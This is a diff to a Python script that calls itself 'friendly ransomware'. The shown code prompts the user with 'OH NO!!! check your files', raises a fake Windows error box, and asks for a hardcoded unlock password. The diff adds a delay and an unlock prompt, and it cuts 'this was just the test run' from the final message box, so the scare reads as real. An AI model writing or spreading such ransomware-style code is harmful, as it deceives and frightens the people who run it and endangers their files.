@@ -33,6 +33,8 @@ for file in files:
 # Password to run the script. DO NOT USE THIS AS THE DECRIPT PASSWORD
 password = "pASS?0wRd"
 userInput = input("OH NO!!! check your files\n")
+time.sleep(2.5)
+print("Enter Unlock Password")
 ctypes.windll.user32.MessageBoxW(0, "OHNO! Cheak your files", "ERROR", 16)
 
 # Checking the password that the user put in, if its right the user will get a message saying the files are decrypted 
@@ -49,4 +51,4 @@ if userInput == password:
 else:
 	print("Wrong password! Please restart your computer to get rid of the friendly ransomeware, THIS WAS JUST A TEST")
 	
-  ctypes.windll.user32.MessageBoxW(0, "Restart your PC to fix this problem <3 this was just the test run", "YourAcutie.TXT", 16)
+  ctypes.windll.user32.MessageBoxW(0, "Restart your PC", "YourAcutie.TXT", 16)
